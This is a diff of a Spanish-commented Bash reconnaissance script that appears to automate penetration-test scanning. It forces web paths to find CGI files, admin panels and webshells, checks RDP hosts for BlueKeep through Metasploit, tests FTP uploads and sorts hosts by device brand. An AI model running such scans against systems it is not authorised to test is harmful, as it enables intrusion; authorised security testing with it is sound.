+					egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|Cloudflare"  # no redirecciona
 					greprc=$?				
 					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Java y no se enumero antes
 					
@@ -2159,14 +2165,16 @@ then
 						echo -e "\t\t[+] Revisando archivos comunes de servidor ($ip -Tomcat)"
 						web-buster.pl -t $ip -p $port -h 3 -d / -m webserver -s 0 -q 1 > logs/enumeracion/"$ip"_"$port"_webarchivos.txt
 						egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_webarchivos.txt >> .enumeracion/"$ip"_"$port"_webarchivos.txt
-						sleep 1										
+						sleep 1	
+					else
+						echo -e "\t\t[+] No es Tomcat o no debemos escanear"
 					fi
 											
 					####################################	
 			
 			
 					#######  if the server is apache ######
-					egrep -i "apache|nginx" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud" # solo el segundo egrep poner "-q"
+					egrep -i "apache|nginx" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|Cloudflare" # solo el segundo egrep poner "-q"
 					greprc=$?
 					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
 													
@@ -2208,12 +2216,12 @@ then
 							greprc=$?
 							if [[ $greprc -ne 0 ]];then # si hay no hay firewall protegiendo la app								
 								echo -e "\t\t[+] Revisando archivos CGI ($ip -Apache/nginx)"
-								web-buster.pl -t $ip -p $port -h 3 -d / -m cgi -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt  
+								web-buster.pl -t $ip -p $port -h 3 -d / -m cgi -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> servicios/cgi.txt  
 								sleep 2						
 							fi	
 						else
 							echo -e "\t\t[+] Revisando archivos CGI ($ip -Apache/nginx)"
-							web-buster.pl -t $ip -p $port -h 3 -d / -m cgi -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt  
+							web-buster.pl -t $ip -p $port -h 3 -d / -m cgi -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> servicios/cgi.txt  
 							sleep 2													
 						fi	
 												
@@ -2235,7 +2243,8 @@ then
 						
 						echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($ip -Apache/nginx)"
 						web-buster.pl -t $ip -p $port -h 3 -d / -m divulgacionInformacion -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/"$ip"_"$port"_divulgacionInformacion.txt 2>/dev/null 						
-																			
+					else
+						echo -e "\t\t[+] No es Apache o no debemos escanear"													
 					fi						
 					####################################						
 										
@@ -2281,13 +2290,13 @@ fi # file exists
 
 
 
-if [ -f .servicios/web-ssl.txt ]
+if [ -f servicios/web-ssl.txt ]
 then    
     
-    echo -e "$OKBLUE #################### WEB - SSL (`wc -l .servicios/web-ssl.txt`) ######################$RESET"	    		
+    echo -e "$OKBLUE #################### WEB - SSL (`wc -l servicios/web-ssl.txt`) ######################$RESET"	    		
 	echo -e "$OKGREEN[i] Identificacion de técnologia usada en los servidores web$RESET"
 	# Extraer informacion web y SSL
-	for line in $(cat .servicios/web-ssl.txt); do    
+	for line in $(cat servicios/web-ssl.txt); do    
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`						
 		while true; do
@@ -2339,7 +2348,7 @@ then
 	  ##############################
 
 	echo -e "$OKGREEN\n[i] Realizando la navegacion forzada $RESET"
-	for line in $(cat .servicios/web-ssl.txt); do    
+	for line in $(cat servicios/web-ssl.txt); do    
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`				
 		echo -e "\n[+] Escaneando $ip:$port"
@@ -2370,7 +2379,7 @@ then
 						egrep -iq $md5 webClone/checksumsEscaneados.txt
 						noEscaneado=$?	
 						
-						egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved" .enumeracion/"$subdominio"_"$port"_webData.txt
+						egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of" .enumeracion/"$subdominio"_"$port"_webData.txt
 						noRedireccion=$?	
 						
 						egrep -qi "403" .enumeracion/"$subdominio"_"$port"_webData.txt #403 - Prohibido: acceso denegado.
@@ -2422,7 +2431,7 @@ then
 								greprc=$?
 								if [[ $greprc -eq 1 ]];then # si hay no hay firewall protegiendo la app								
 									echo -e "\t\t[+] Revisando archivos CGI ($subdominio - Apache/nginx)"
-									web-buster.pl -t $subdominio -p $port -h 3 -d / -m cgi -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt; cat .servicios/cgi.txt >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt
+									web-buster.pl -t $subdominio -p $port -h 3 -d / -m cgi -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> servicios/cgi.txt; cat servicios/cgi.txt >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt
 									sleep 2
 								fi	
 						
@@ -2586,7 +2595,7 @@ then
 				
 				
 				############### Escaneo por IP ############
-				echo -e "[+]\tEscaneo solo por IP $ip:$port"
+				echo -e "[+]\tEscaneo solo por IP (https) $ip:$port"
 				wget --timeout=5 --tries=1 --no-check-certificate  https://$ip -O webClone/https-$ip.html 2>/dev/null
 				sed -i "s/\/index.php//g" webClone/https-$ip.html 2>/dev/null
 				sed -i "s/https/http/g" webClone/https-$ip.html 2>/dev/null				
@@ -2602,10 +2611,10 @@ then
 				egrep -iq $md5 webClone/checksumsEscaneados.txt
 				noEscaneado=$?
 				
-				egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved" .enumeracion/"$subdominio"_"$port"_webData.txt
+				egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of" .enumeracion/"$ip"_"$port"_webData.txt
 				noRedireccion=$?	
 						
-				egrep -qi "403" .enumeracion/"$subdominio"_"$port"_webData.txt #403 - Prohibido: acceso denegado.
+				egrep -qi "403" .enumeracion/"$ip"_"$port"_webData.txt #403 - Prohibido: acceso denegado.
 				accesoDenegado=$?	
 						
 						
@@ -2705,12 +2714,12 @@ then
 							greprc=$?
 							if [[ $greprc -ne 0 ]];then # si hay no hay firewall protegiendo la app								
 								echo -e "\t\t[+] Revisando archivos CGI ($ip -Apache/nginx)"
-								web-buster.pl -t $ip -p $port -h 3 -d / -m cgi -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt  
+								web-buster.pl -t $ip -p $port -h 3 -d / -m cgi -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> servicios/cgi.txt  
 								sleep 2						
 							fi	
 						else
 							echo -e "\t\t[+] Revisando archivos CGI ($ip -Apache/nginx)"
-							web-buster.pl -t $ip -p $port -h 3 -d / -m cgi -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt  
+							web-buster.pl -t $ip -p $port -h 3 -d / -m cgi -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> servicios/cgi.txt  
 							sleep 2													
 						fi	
 																				
@@ -2729,8 +2738,8 @@ then
 						web-buster.pl -t $ip -p $port -h 3 -d / -m backdoorApache -s 1 -q 1 > logs/vulnerabilidades/"$ip"_"$port"_webshell.txt  
 						egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_webshell.txt  | awk '{print $2}' >> .vulnerabilidades/"$ip"_"$port"_webshell.txt  
 						sleep 2
-						echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($ip - Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h 3 -d / -m divulgacionInformacion -s 1 -q 1  egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/"$ip"_"$port"_divulgacionInformacion.txt 2>/dev/null 
+						echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($ip - Apache/nginx)"						
+						web-buster.pl -t $ip -p $port -h 3 -d / -m divulgacionInformacion -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/"$ip"_"$port"_divulgacionInformacion.txt 2>/dev/null &
 					fi						
 					####################################
 		
@@ -2943,18 +2952,18 @@ egrep -ira --color=never "mysql_query| mysql_fetch_array|access denied for user|
 grep -Eirao "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" webClone/* | cut -d ":" -f2 | egrep --color=never $"com|net|org|bo|es" |  sort |uniq  >> .enumeracion/"$DOMAIN"_web_correos.txt
 
 insert_data
-find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
+find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
 ###################
 
 
 
-if [ -f .servicios/rdp.txt ]
+if [ -f servicios/rdp.txt ]
 then
     
     #if [ $rdp == "s" ] ; then	
 		#mkdir -p screenshots
-		echo -e "$OKBLUE #################### RDP (`wc -l .servicios/rdp.txt`) ######################$RESET"	  
-		for line in $(cat .servicios/rdp.txt); do
+		echo -e "$OKBLUE #################### RDP (`wc -l servicios/rdp.txt`) ######################$RESET"	  
+		for line in $(cat servicios/rdp.txt); do
 			ip=`echo $line | cut -f1 -d":"`
 			port=`echo $line | cut -f2 -d":"`
 			#nmap -Pn -p $port $ip --script=rdp_enum-encryption > .enumeracion/$ip/rdp.txt 2>/dev/null					
@@ -2962,10 +2971,11 @@ then
 			echo -e "\t\t[+] Revisando vulnerabilidad blueKeep"
 			
 			kernel=`uname -a`
-			if [[ $kernel == *"aarch64"* ]]; then #rasberry
+			#if [[ $kernel == *"x86_64"* ]]; then #no es rasberry
+			if [[ $kernel == *"x86_64"* || $kernel == *"i686"* ]]; then #no es rasberry
 				blueKeep $ip >> logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt
 				grep "VULNERABLE" logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt  > .vulnerabilidades/"$ip"_3389_BlueKeep.txt
-			else
+			else # es rasberry
 				msfconsole -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt
 				grep "target is vulnerable" logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt  > .vulnerabilidades/"$ip"_3389_BlueKeep.txt
 			fi
@@ -3015,11 +3025,11 @@ find logs -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
 
 
 
-if [ -f .servicios/ftp.txt ]
+if [ -f servicios/ftp.txt ]
 then
-	echo -e "$OKBLUE #################### FTP (`wc -l .servicios/ftp.txt`) ######################$RESET"	    
+	echo -e "$OKBLUE #################### FTP (`wc -l servicios/ftp.txt`) ######################$RESET"	    
 	touch 68b329da9893e34099c7d8ad5cb9c940.txt # file to test upload
-	for line in $(cat .servicios/ftp.txt); do
+	for line in $(cat servicios/ftp.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		
@@ -3057,11 +3067,11 @@ then
 fi
 
 
-if [ -f .servicios/cgi.txt ]
+if [ -f servicios/cgi.txt ]
 then
         		
-		echo -e "$OKBLUE #################### CGI (`wc -l .servicios/cgi.txt`) ######################$RESET"	  
-		for line in $(cat .servicios/cgi.txt); do
+		echo -e "$OKBLUE #################### CGI (`wc -l servicios/cgi.txt`) ######################$RESET"	  
+		for line in $(cat servicios/cgi.txt); do
 			ip=`echo $line |  cut -d ":" -f 2 | tr -d /`
 			port_path=`echo $line | cut -d ":" -f 3`
 			port=`echo $port_path | cut -d "/" -f 1`
@@ -3091,10 +3101,10 @@ fi
 
 
 
-if [ -f .servicios/dns.txt ]
+if [ -f servicios/dns.txt ]
 then
-	echo -e "$OKBLUE #################### DNS (`wc -l .servicios/dns.txt`) ######################$RESET"	  
-	for line in $(cat .servicios/dns.txt); do
+	echo -e "$OKBLUE #################### DNS (`wc -l servicios/dns.txt`) ######################$RESET"	  
+	for line in $(cat servicios/dns.txt); do
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		echo -e "[+] Escaneando $ip:$port"	
@@ -3137,9 +3147,9 @@ fi
 
 	
 ## Procesar los usuarios enumerados con smtp-user-enum
-if [ -f .servicios/smtp.txt ]
+if [ -f servicios/smtp.txt ]
 	then
-		echo -e "$OKBLUE #################### SMTP (`wc -l .servicios/smtp.txt`) ######################$RESET"	    
+		echo -e "$OKBLUE #################### SMTP (`wc -l servicios/smtp.txt`) ######################$RESET"	    
 		
 		# revisar si hay scripts ejecutandose
 		echo -e "[+] Verificar si se esta ejecutando smtp-user-enum"
@@ -3168,7 +3178,7 @@ if [ -f .servicios/smtp.txt ]
 			else				
 				echo -e "\t$OKGREEN[i] No se encontro usuarios $RESET"
 			fi
-		done <.servicios/smtp.txt	
+		done <servicios/smtp.txt	
 		insert_data
 fi		 
 
@@ -3199,26 +3209,26 @@ cat .nmap_banners/*.txt > reportes/nmap-tcp-banners.txt
 
 
 cd .nmap		
-	grep -i "MikroTik" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/MikroTik2.txt
-	grep ' 8728/open' nmap-tcp.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/MikroTik2.txt 
-	sort ../.servicios/MikroTik2.txt | sort | uniq > ../.servicios/MikroTik.txt; rm ../.servicios/MikroTik2.txt
+	grep -i "MikroTik" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/MikroTik2.txt
+	grep ' 8728/open' nmap-tcp.grep 2>/dev/null| awk '{print $2}' >> ../servicios/MikroTik2.txt 
+	sort ../servicios/MikroTik2.txt | sort | uniq > ../servicios/MikroTik.txt; rm ../servicios/MikroTik2.txt
 	
-	grep -i "d-link" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/d-link2.txt
-	grep -i "Dropbear sshd" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/ubiquiti2.txt
-	grep -i "forti" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/fortinet2.txt
-	grep -i "3com" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/3com2.txt
-	grep -i "linksys" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/linksys2.txt
-	grep -i "Netgear" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/Netgear.txt
-	grep -i "zyxel" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/zyxel.txt
-	grep -i "ZTE" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/ZTE2.txt
-	grep -i "UPS devices or Windows" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/ZTE2.txt
-	grep -i "TP-link" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/tp-link.txt
-	grep -i "cisco" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/cisco.txt
-	grep -i "ASA" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/ciscoASA.txt	
-	grep -i "samba" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/samba.txt
-	grep -i "Allegro RomPager" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/RomPager.txt
-	grep -i "NetScreen" nmap-tcp-banners.grep | grep -iv "Virata" 2>/dev/null | awk '{print $2}' >> ../.servicios/NetScreen.txt #juniper
-	grep -i "UPnP" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/upnp.txt; sort ../.servicios/upnp.txt | uniq >../.servicios/upnp2.txt ; mv ../.servicios/upnp2.txt ../.servicios/upnp.txt
+	grep -i "d-link" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/d-link2.txt
+	grep -i "Dropbear sshd" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/ubiquiti2.txt
+	grep -i "forti" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/fortinet2.txt
+	grep -i "3com" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/3com2.txt
+	grep -i "linksys" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/linksys2.txt
+	grep -i "Netgear" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/Netgear.txt
+	grep -i "zyxel" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/zyxel.txt
+	grep -i "ZTE" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/ZTE2.txt
+	grep -i "UPS devices or Windows" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/ZTE2.txt
+	grep -i "TP-link" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/tp-link.txt
+	grep -i "cisco" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/cisco.txt
+	grep -i "ASA" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/ciscoASA.txt	
+	grep -i "samba" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/samba.txt
+	grep -i "Allegro RomPager" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/RomPager.txt
+	grep -i "NetScreen" nmap-tcp-banners.grep | grep -iv "Virata" 2>/dev/null | awk '{print $2}' >> ../servicios/NetScreen.txt #juniper
+	grep -i "UPnP" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/upnp.txt; sort ../servicios/upnp.txt | uniq >../servicios/upnp2.txt ; mv ../servicios/upnp2.txt ../servicios/upnp.txt
 	
 	### Revisar certificados SSL, Titulos web ##
 	cd ..
@@ -3227,87 +3237,86 @@ cd .nmap
 	
 	#phpmyadmin, etc
 	#responde con 401
-	grep --color=never -i admin * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|whois|google|webData|Usando archivo" | grep 401 | awk '{print $2}' | sort | uniq -i >> ../.servicios/web401.txt
+	grep --color=never -i admin * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|whois|google|webData|Usando archivo" | grep 401 | awk '{print $2}' | sort | uniq -i >> ../servicios/web401.txt
 	
 	#.enumeracion/"$ip"_"$port"_admin.txt 
 	#responde con 200 OK
-	cat *_admin.txt 2>/dev/null | grep 200 | awk '{print $2}' | sort | uniq -i >> ../.servicios/admin-web.txt 
+	cat *_admin.txt 2>/dev/null | grep 200 | awk '{print $2}' | sort | uniq -i >> ../servicios/admin-web.txt 
 	
 	#tomcat
-	grep --color=never -i "/manager/html" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|whois|google" | awk '{print $2}' | sort | uniq -i >> ../.servicios/admin-web.txt
+	grep --color=never -i "/manager/html" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|whois|google" | awk '{print $2}' | sort | uniq -i >> ../servicios/admin-web.txt
 	# 
 	
 	#fortinet
-	grep --color=never -i forti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | cut -d "_" -f1 >> ../.servicios/fortinet2.txt
-	sort ../.servicios/fortinet2.txt | uniq > ../.servicios/fortinet.txt
-	rm ../.servicios/fortinet2.txt
+	grep --color=never -i forti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | cut -d "_" -f1 >> ../servicios/fortinet2.txt
+	sort ../servicios/fortinet2.txt | uniq > ../servicios/fortinet.txt
+	rm ../servicios/fortinet2.txt
 	
 	#3com
-	grep --color=never -i 3com * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | cut -d "_" -f1 >> ../.servicios/3com2.txt
-	sort ../.servicios/3com2.txt | uniq > ../.servicios/3com.txt
-	rm ../.servicios/3com2.txt
+	grep --color=never -i 3com * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | cut -d "_" -f1 >> ../servicios/3com2.txt
+	sort ../servicios/3com2.txt | uniq > ../servicios/3com.txt
+	rm ../servicios/3com2.txt
 	
 	#d-link
-	grep --color=never -i d-link * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | cut -d "_" -f1 >> ../.servicios/d-link2.txt
-	sort ../.servicios/d-link2.txt | uniq > ../.servicios/d-link.txt
-	rm ../.servicios/d-link2.txt
+	grep --color=never -i d-link * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | cut -d "_" -f1 >> ../servicios/d-link2.txt
+	sort ../servicios/d-link2.txt | uniq > ../servicios/d-link.txt
+	rm ../servicios/d-link2.txt
 
 	#linksys
-	grep --color=never -i linksys * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | cut -d "_" -f1 >> ../.servicios/linksys2.txt
-	sort ../.servicios/linksys2.txt | uniq > ../.servicios/linksys.txt
-	rm ../.servicios/linksys2.txt
+	grep --color=never -i linksys * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | cut -d "_" -f1 >> ../servicios/linksys2.txt
+	sort ../servicios/linksys2.txt | uniq > ../servicios/linksys.txt
+	rm ../servicios/linksys2.txt
 		
 	
 	#Pentahoo	
 	# Pentaho User Console - Login~~~~ ~~~/pentaho~~~login~ Apache-Coyote/1.1
-	grep --color=never -i pentaho * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" > ../.servicios/pentaho.txt
+	grep --color=never -i pentaho * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" > ../servicios/pentaho.txt
 	
 	#ubiquiti
-	grep --color=never -i ubiquiti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../.servicios/ubiquiti2.txt	
-	sort ../.servicios/ubiquiti2.txt | uniq > ../.servicios/ubiquiti.txt ; rm ../.servicios/ubiquiti2.txt
+	grep --color=never -i ubiquiti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/ubiquiti2.txt	
+	sort ../servicios/ubiquiti2.txt | uniq > ../servicios/ubiquiti.txt ; rm ../servicios/ubiquiti2.txt
 	
 	#pfsense
-	grep --color=never -i pfsense * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../.servicios/pfsense.txt
+	grep --color=never -i pfsense * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/pfsense.txt
 	
 	#PRTG
-	grep --color=never -i PRTG * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../.servicios/PRTG.txt
+	grep --color=never -i PRTG * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/PRTG.txt
 	
 	#ZKsoftware
-	grep --color=never -i ZK * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389"| sort | cut -d "_" -f1 | uniq | tr "_" ":" >> ../.servicios/ZKSoftware.txt		
+	grep --color=never -i ZK * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389"| sort | cut -d "_" -f1 | uniq | tr "_" ":" >> ../servicios/ZKSoftware.txt		
 	
 	#ZTE
-	grep --color=never -i ZTE * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1 | uniq | tr "_" ":" >> ../.servicios/ZTE2.txt
-	sort ../.servicios/ZTE2.txt | uniq > ../.servicios/ZTE.txt ; rm ../.servicios/ZTE2.txt
+	grep --color=never -i ZTE * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1 | uniq | tr "_" ":" >> ../servicios/ZTE2.txt
+	sort ../servicios/ZTE2.txt | uniq > ../servicios/ZTE.txt ; rm ../servicios/ZTE2.txt
 		
 	
 	#zimbra
-	grep --color=never -i zimbra * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../.servicios/zimbra.txt		
+	grep --color=never -i zimbra * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/zimbra.txt		
 	
 	#jboss
-	grep --color=never -i jboss * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../.servicios/jboss.txt
+	grep --color=never -i jboss * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/jboss.txt
 	
 	#401
 		#line = http://200.87.193.109:80/phpmyadmin/	
-	grep --color=never -i Unauthorized * 2>/dev/null| grep --color=never http | cut -d "_" -f1 > ../.servicios/web401-2.txt
+	grep --color=never -i Unauthorized * 2>/dev/null| grep --color=never http | cut -d "_" -f1 > ../servicios/web401-2.txt
 		#line=10.0.0.2:443
-	grep --color=never -i Unauthorized * 2>/dev/null | cut -d "_" -f1-2 | uniq | tr "_" ":"   > ../.servicios/web401-2.txt
+	grep --color=never -i Unauthorized * 2>/dev/null | cut -d "_" -f1-2 | uniq | tr "_" ":"   > ../servicios/web401-2.txt
 	# sort
-	sort ../.servicios/web401-2.txt | uniq >> ../.servicios/web401.txt
-	rm ../.servicios/web401-2.txt
+	sort ../servicios/web401-2.txt | uniq >> ../servicios/web401.txt
+	rm ../servicios/web401-2.txt
 	
 cd ..
 ################################
 
-find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null
+find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null
 
 # UPNP
-#falta
-if [ -f .servicios/upnp.txt ]
+if [ -f servicios/upnp.txt ]
 then
 
 	if [ $internet == "s" ]; then 			
-		echo -e "$OKBLUE #################### UPnP (`wc -l .servicios/upnp.txt`) ######################$RESET"
-		for ip in $(cat .servicios/upnp.txt); do		
+		echo -e "$OKBLUE #################### UPnP (`wc -l servicios/upnp.txt`) ######################$RESET"
+		for ip in $(cat servicios/upnp.txt); do		
 			echo -e "[+] Escaneando $ip:1900"		
 			echo "upnp_info.py $ip"  >> logs/vulnerabilidades/"$ip"_1900_upnpEnum.txt 2>/dev/null
 			upnp_info.py $ip  >> logs/vulnerabilidades/"$ip"_1900_upnpEnum.txt 2>/dev/null &
@@ -3328,7 +3337,7 @@ then
 		done	# done true		
 	
 		# Revisar si se detecto servicios upnp
-		for ip in $(cat .servicios/upnp.txt); do			
+		for ip in $(cat servicios/upnp.txt); do			
 					
 			egrep -iq "http" logs/vulnerabilidades/"$ip"_1900_upnpEnum.txt
 			greprc=$?
@@ -3347,9 +3356,9 @@ fi
 
 
 #zimbra
